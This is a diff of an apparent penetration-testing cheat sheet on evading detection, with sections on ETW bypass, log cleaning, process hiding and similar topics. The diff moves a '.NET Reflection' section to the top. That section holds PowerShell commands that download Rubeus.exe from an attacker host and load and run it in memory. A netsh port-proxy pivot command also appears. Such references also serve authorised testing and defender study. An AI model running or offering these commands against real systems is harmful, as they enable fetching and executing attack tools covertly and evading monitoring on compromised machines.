@@ -2,18 +2,26 @@
 
 ## Table of Contents
 
+- [.NET Reflection](#net-reflection)
 - [Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)](#avoid-invoke-expression-iex-and-invoke-webrequest-iwr)
 - [Bypassing Event Tracing for Windows (ETW)](#bypassing-event-tracing-for-windows-etw)
 - [Clear Linux History](#clear-linux-history)
 - [Hiding SSH Sessions](#hiding-ssh-sessions)
 - [Logfile Cleaning](#logfile-cleaning)
 - [LOLBAS](#lolbas)
-- [.NET Reflection](#net-reflection)
 - [Process Hiding](#process-hiding)
 - [ProxyChains](#proxychains)
 - [Save File Deletion](#save-file-deletion)
 - [Sneaky Directory](#sneaky-directory)
 - [Windows Advanced Threat Protection (ATP)](#windows-advanced-threat-protection-atp)
+
+## .NET Reflection
+
+```c
+PS C:\> $d = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
+PS C:\> $a = [System.Reflection.Assembly]::Load($d)
+PS C:\> [Rubeus.Program]::Main("-h".Split())
+```
 
 ## Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)
 
@@ -108,14 +116,6 @@ C:\Windows\system32> rundll32 C:\Windows\system32\ieframe.dll,OpenURL C:\<FILE>.
 
 ```c
 C:\> netsh interface portproxy add v4tov4 listenaddress=<RHOST> listenport=<RPORT> connectaddress=<LHOST> connectport=<LPORT>
-```
-
-## .NET Reflection
-
-```c
-PS C:\> $d = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
-PS C:\> $a = [System.Reflection.Assembly]::Load($d)
-PS C:\> [Rubeus.Program]::Main("-h".Split())
 ```
 
 ## Process Hiding
